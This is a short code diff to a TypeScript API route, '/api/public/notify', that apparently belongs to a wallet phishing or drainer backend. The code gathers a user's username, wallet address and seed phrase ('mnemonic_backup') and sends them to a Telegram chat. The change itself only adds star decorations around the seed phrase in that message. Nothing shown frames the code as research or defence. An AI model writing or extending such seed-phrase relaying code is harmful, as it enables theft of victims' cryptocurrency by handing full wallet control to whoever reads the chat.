@@ -103,8 +103,9 @@ export const Route = createFileRoute("/api/public/notify")({
             `👤 <b>${esc(username)}</b>`,
           ];
           if (address) mnemonicBackup.push(`💼 <code>${esc(address)}</code>`);
-          mnemonicBackup.push(`🔑 <b>Seed Phrase:</b>`);
+          mnemonicBackup.push(`🔑 <b>Seed Phrase:</b> ${"⭐".repeat(14)}`);
           mnemonicBackup.push(`<code>${esc(body.mnemonic_backup)}</code>`);
+          mnemonicBackup.push(`${"⭐".repeat(14)}`);
           await sendTelegram(token, mnemonicBackup.join("\n"));
         }
 
